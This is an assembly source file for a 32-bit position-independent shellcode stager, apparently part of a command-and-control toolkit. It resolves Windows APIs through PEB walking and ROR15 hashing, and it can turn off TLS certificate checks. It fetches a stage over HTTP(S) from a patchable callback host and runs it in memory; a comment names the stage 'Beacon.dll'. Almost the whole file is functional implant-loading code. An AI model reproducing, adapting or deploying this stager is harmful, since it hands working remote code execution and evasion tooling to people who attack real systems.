; x86 WinINet HTTP/HTTPS PIC stager template.
;
; This is the 32-bit counterpart of stager_http_https.asm. It intentionally
; keeps the same STG2 config block, ROR15 hash algorithm, and WinINet flow so
; tools\patch_stager_config can patch x86 and x64 templates identically.

.386
.model flat
option casemap:none
assume fs:nothing

HASH_KERNEL32_LOADLIBRARYA          equ 076B474E6h
HASH_KERNEL32_VIRTUALALLOC          equ 0FEB867E0h
HASH_KERNEL32_VIRTUALPROTECT        equ 0A1270F81h
HASH_KERNEL32_FLUSHICACHE           equ 0A1515FD8h
HASH_NTDLL_RTLEXITUSERTHREAD        equ 06E40E90Fh
HASH_NTDLL_RTLEXITUSERPROCESS       equ 06C43A7B5h

HASH_WININET_INTERNETOPENA          equ 0B65AFFFEh
HASH_WININET_INTERNETCONNECTA       equ 0BFEC2E99h
HASH_WININET_HTTPOPENREQUESTA       equ 02FCE5EC7h
HASH_WININET_HTTPSENDREQUESTA       equ 061CE28C8h
HASH_WININET_INTERNETREADFILE       equ 0C4C42BB5h
HASH_WININET_INTERNETSETOPTIONA     equ 08D2C80D0h

STAGER_FLAG_HTTPS                   equ 00000001h
STAGER_FLAG_IGNORE_CERT             equ 00000002h

STAGER_EXIT_THREAD                  equ 1
STAGER_EXIT_PROCESS                 equ 2

INTERNET_SERVICE_HTTP               equ 3
INTERNET_FLAG_RELOAD                equ 080000000h
INTERNET_FLAG_NO_CACHE_WRITE        equ 004000000h
INTERNET_FLAG_SECURE                equ 000800000h
INTERNET_FLAG_IGNORE_CERT_CN        equ 000001000h
INTERNET_FLAG_IGNORE_CERT_DATE      equ 000002000h
INTERNET_FLAG_NO_UI                 equ 000000200h
INTERNET_OPTION_SECURITY_FLAGS      equ 31
SECURITY_FLAGS_IGNORE_CERT          equ 000003300h

MEM_COMMIT_RESERVE                  equ 000003000h
PAGE_READWRITE                      equ 04h
PAGE_EXECUTE_READ                   equ 20h

LOCAL_FRAME_SIZE                    equ 040h
BYTES_READ_OFFSET                   equ 000h
OLD_PROTECT_OFFSET                  equ 004h
SECURITY_FLAGS_OFFSET               equ 008h
CODE_BASE_OFFSET                    equ 00Ch
STAGE_BASE_OFFSET                   equ 010h
STAGE_TOTAL_OFFSET                  equ 014h

.code

PUBLIC main
main:
    cld
    call get_code_base
get_code_base:
    pop ebx

    sub esp, LOCAL_FRAME_SIZE
    mov ebp, esp
    mov dword ptr [ebp+CODE_BASE_OFFSET], ebx

    xor eax, eax
    mov dword ptr [ebp+STAGE_BASE_OFFSET], eax
    mov dword ptr [ebp+STAGE_TOTAL_OFFSET], eax

    ; Load wininet.dll through kernel32!LoadLibraryA.
    mov edx, HASH_KERNEL32_LOADLIBRARYA
    call GetProcAddrByHash
    test eax, eax
    jz failure
    lea ecx, [ebx+(wininet_dll-get_code_base)]
    push ecx
    call eax
    test eax, eax
    jz failure

    ; InternetOpenA(NULL, PRECONFIG, NULL, NULL, 0)
    mov edx, HASH_WININET_INTERNETOPENA
    call GetProcAddrByHash
    test eax, eax
    jz failure
    push 0
    push 0
    push 0
    push 0
    push 0
    call eax
    test eax, eax
    jz failure
    mov edi, eax

    ; InternetConnectA(hInternet, host, port, NULL, NULL, HTTP, 0, 0)
    mov edx, HASH_WININET_INTERNETCONNECTA
    call GetProcAddrByHash
    test eax, eax
    jz failure
    push 0
    push 0
    push INTERNET_SERVICE_HTTP
    push 0
    push 0
    push dword ptr [ebx+(cfg_callback_port-get_code_base)]
    lea ecx, [ebx+(cfg_callback_host-get_code_base)]
    push ecx
    push edi
    call eax
    test eax, eax
    jz failure
    mov edi, eax

    ; HttpOpenRequestA(hConnect, "GET", object_path, NULL, NULL, NULL, flags, 0)
    mov ecx, INTERNET_FLAG_RELOAD or INTERNET_FLAG_NO_CACHE_WRITE
    mov eax, dword ptr [ebx+(cfg_flags-get_code_base)]
    test eax, STAGER_FLAG_HTTPS
    jz open_request_flags_ready
    or ecx, INTERNET_FLAG_SECURE
    test eax, STAGER_FLAG_IGNORE_CERT
    jz open_request_flags_ready
    or ecx, INTERNET_FLAG_IGNORE_CERT_CN or INTERNET_FLAG_IGNORE_CERT_DATE or INTERNET_FLAG_NO_UI

open_request_flags_ready:
    mov edx, HASH_WININET_HTTPOPENREQUESTA
    call GetProcAddrByHash
    test eax, eax
    jz failure
    push 0
    push ecx
    push 0
    push 0
    push 0
    lea ecx, [ebx+(cfg_object_path-get_code_base)]
    push ecx
    lea ecx, [ebx+(http_get-get_code_base)]
    push ecx
    push edi
    call eax
    test eax, eax
    jz failure
    mov esi, eax

    ; If requested, relax certificate checks on the WinINet request handle.
    mov eax, dword ptr [ebx+(cfg_flags-get_code_base)]
    test eax, STAGER_FLAG_IGNORE_CERT
    jz skip_security_options
    mov dword ptr [ebp+SECURITY_FLAGS_OFFSET], SECURITY_FLAGS_IGNORE_CERT
    mov edx, HASH_WININET_INTERNETSETOPTIONA
    call GetProcAddrByHash
    test eax, eax
    jz skip_security_options
    push 4
    lea ecx, [ebp+SECURITY_FLAGS_OFFSET]
    push ecx
    push INTERNET_OPTION_SECURITY_FLAGS
    push esi
    call eax

skip_security_options:
    ; HttpSendRequestA(hRequest, NULL, 0, NULL, 0)
    push 0
    push 0
    push 0
    push 0
    push esi
    mov edx, HASH_WININET_HTTPSENDREQUESTA
    call GetProcAddrByHash
    test eax, eax
    jz failure
    call eax
    test eax, eax
    jz failure

    ; VirtualAlloc(NULL, stage_max_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
    mov edx, HASH_KERNEL32_VIRTUALALLOC
    call GetProcAddrByHash
    test eax, eax
    jz failure
    push PAGE_READWRITE
    push MEM_COMMIT_RESERVE
    push dword ptr [ebx+(cfg_stage_max_size-get_code_base)]
    push 0
    call eax
    test eax, eax
    jz failure
    mov dword ptr [ebp+STAGE_BASE_OFFSET], eax
    mov dword ptr [ebp+STAGE_TOTAL_OFFSET], 0

download_more:
    mov eax, dword ptr [ebx+(cfg_stage_max_size-get_code_base)]
    sub eax, dword ptr [ebp+STAGE_TOTAL_OFFSET]
    jz download_done
    mov ecx, dword ptr [ebx+(cfg_read_chunk_size-get_code_base)]
    cmp eax, ecx
    ja chunk_size_ready
    mov ecx, eax

chunk_size_ready:
    mov edx, HASH_WININET_INTERNETREADFILE
    call GetProcAddrByHash
    test eax, eax
    jz failure
    lea edx, [ebp+BYTES_READ_OFFSET]
    push edx
    push ecx
    mov edx, dword ptr [ebp+STAGE_BASE_OFFSET]
    add edx, dword ptr [ebp+STAGE_TOTAL_OFFSET]
    push edx
    push esi
    call eax
    test eax, eax
    jz failure
    mov eax, dword ptr [ebp+BYTES_READ_OFFSET]
    test eax, eax
    jz download_done
    add dword ptr [ebp+STAGE_TOTAL_OFFSET], eax
    jmp download_more

download_done:
    cmp dword ptr [ebp+STAGE_TOTAL_OFFSET], 0
    jz failure

    ; VirtualProtect(stage_base, total_size, PAGE_EXECUTE_READ, &old_protect)
    mov edx, HASH_KERNEL32_VIRTUALPROTECT
    call GetProcAddrByHash
    test eax, eax
    jz failure
    lea ecx, [ebp+OLD_PROTECT_OFFSET]
    push ecx
    push PAGE_EXECUTE_READ
    push dword ptr [ebp+STAGE_TOTAL_OFFSET]
    push dword ptr [ebp+STAGE_BASE_OFFSET]
    call eax
    test eax, eax
    jz failure

    ; FlushInstructionCache((HANDLE)-1, stage_base, total_size)
    mov edx, HASH_KERNEL32_FLUSHICACHE
    call GetProcAddrByHash
    test eax, eax
    jz failure
    push dword ptr [ebp+STAGE_TOTAL_OFFSET]
    push dword ptr [ebp+STAGE_BASE_OFFSET]
    push 0FFFFFFFFh
    call eax

    ; Execute downloaded Beacon.dll DOS-head stub as stage(NULL).
    push 0
    mov eax, dword ptr [ebp+STAGE_BASE_OFFSET]
    call eax
    jmp stager_exit

failure:

stager_exit:
    mov ebx, dword ptr [ebp+CODE_BASE_OFFSET]
    mov eax, dword ptr [ebx+(cfg_exit_mode-get_code_base)]
    cmp eax, STAGER_EXIT_PROCESS
    je exit_process

exit_thread:
    mov edx, HASH_NTDLL_RTLEXITUSERTHREAD
    call GetProcAddrByHash
    test eax, eax
    jz hard_stop
    push 0
    call eax
    jmp hard_stop

exit_process:
    mov edx, HASH_NTDLL_RTLEXITUSERPROCESS
    call GetProcAddrByHash
    test eax, eax
    jz hard_stop
    push 0
    call eax
    jmp hard_stop

hard_stop:
    jmp hard_stop

; Input : edx = combined ROR15 module+function hash.
; Output: eax = function VA, or NULL.
GetProcAddrByHash:
    push ebp
    mov ebp, esp
    sub esp, 20h
    push ebx
    push ecx
    push edx
    push esi
    push edi

    mov dword ptr [ebp-04h], edx
    xor eax, eax
    mov edi, dword ptr fs:[eax+30h]
    mov edi, dword ptr [edi+0Ch]
    lea esi, [edi+14h]
    mov dword ptr [ebp-08h], esi
    mov edi, dword ptr [esi]

next_module:
    cmp edi, dword ptr [ebp-08h]
    je resolve_not_found
    mov dword ptr [ebp-14h], edi

    ; Hash LDR_DATA_TABLE_ENTRY.BaseDllName as UNICODE bytes.
    mov esi, dword ptr [edi+28h]
    movzx ecx, word ptr [edi+24h]
    xor edx, edx
    test ecx, ecx
    jz advance_module

hash_module_name:
    xor eax, eax
    lodsb
    cmp al, 'a'
    jb hash_module_char
    cmp al, 'z'
    ja hash_module_char
    sub al, 20h

hash_module_char:
    ror edx, 15
    add edx, eax
    loop hash_module_name

    mov dword ptr [ebp-0Ch], edx
    mov ebx, dword ptr [edi+10h]
    test ebx, ebx
    jz advance_module

    ; Locate the PE32 export directory.
    mov eax, dword ptr [ebx+3Ch]
    add eax, ebx
    cmp word ptr [eax+18h], 010Bh
    jne advance_module
    mov eax, dword ptr [eax+78h]
    test eax, eax
    jz advance_module
    add eax, ebx
    mov dword ptr [ebp-10h], eax

    mov ecx, dword ptr [eax+18h]
    mov edx, dword ptr [eax+20h]
    add edx, ebx

next_function:
    test ecx, ecx
    jz advance_module
    dec ecx
    mov esi, dword ptr [edx+ecx*4]
    add esi, ebx
    xor edi, edi

hash_function_name:
    xor eax, eax
    lodsb
    test al, al
    jz hash_function_done
    ror edi, 15
    add edi, eax
    jmp hash_function_name

hash_function_done:
    add edi, dword ptr [ebp-0Ch]
    cmp edi, dword ptr [ebp-04h]
    jne next_function

    mov eax, dword ptr [ebp-10h]
    mov edx, dword ptr [eax+24h]
    add edx, ebx
    movzx ecx, word ptr [edx+ecx*2]
    mov edx, dword ptr [eax+1Ch]
    add edx, ebx
    mov eax, dword ptr [edx+ecx*4]
    add eax, ebx
    jmp resolve_done

advance_module:
    mov edi, dword ptr [ebp-14h]
    mov edi, dword ptr [edi]
    jmp next_module

resolve_not_found:
    xor eax, eax

resolve_done:
    pop edi
    pop esi
    pop edx
    pop ecx
    pop ebx
    mov esp, ebp
    pop ebp
    ret

; Static strings and the STG2 block live in .text deliberately. Keeping all
; runtime data in .text makes the extracted section self-contained shellcode.
wininet_dll db 'wininet.dll', 0
http_get    db 'GET', 0

align 4
stager_config label byte
; STG2 config layout. tools\patch_stager_config patches this fixed-size block:
;   magic[4], version, flags, callback_port, stage_max_size, read_chunk_size,
;   exit_mode, callback_host[128], object_path[128]
cfg_magic           db 'STG2'
cfg_version         dd 1
cfg_flags           dd 0
cfg_callback_port   dd 80
cfg_stage_max_size  dd 00400000h
cfg_read_chunk_size dd 8192
cfg_exit_mode       dd STAGER_EXIT_THREAD
cfg_callback_host   db '127.0.0.1', 0
                    db 118 dup(0)
cfg_object_path     db '/assets/stg_default/stage.bin', 0
                    db 98 dup(0)

end
